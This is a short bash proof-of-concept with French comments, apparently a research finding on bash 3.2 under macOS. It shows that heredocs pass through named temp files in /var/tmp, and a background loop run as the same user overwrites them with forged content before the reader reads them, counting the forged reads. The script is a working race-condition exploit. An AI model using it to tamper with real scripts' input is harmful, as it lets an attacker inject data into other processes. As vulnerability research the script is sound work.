#!/usr/bin/env bash
#
# [98], 10/10/2026 — trouvaille f6 → [108]. Un heredoc de bash 3.2 est un fichier
# NOMMÉ /var/tmp/sh-thd-<n> (P_tmpdir, pas $TMPDIR) entre sa création et son
# délien. Un process du même utilisateur qui boucle sur /var/tmp/sh-thd* le voit
# et peut y écrire avant que le lecteur ne lise. Hors du pack, bash 3.2.57 darwin.
#
# Usage : bash f6-les-heredocs.sh <fichier-journal>
# Mesuré : 3000 heredocs, 40168 noms vus (m4), 2 lectures forgées (espion naïf).

( end=$((SECONDS+6)); while [ $SECONDS -lt $end ]; do
    for f in /var/tmp/sh-thd*; do
      [ -O "$f" ] || continue
      printf 'FORGED\tforged\n' 1<>"$f" 2>/dev/null && printf '%s\n' "$f" >>"$1.w"
    done
  done ) &
spy=$!
x='honest	value'
forged=0 total=0
for i in $(seq 1 3000); do
  while read -r a b; do total=$((total+1)); [ "$a" = FORGED ] && forged=$((forged+1)); done <<SLOTS
$x
SLOTS
done
wait $spy
echo "reads=$total forged=$forged spy-writes=$(wc -l < "$1.w" 2>/dev/null)"
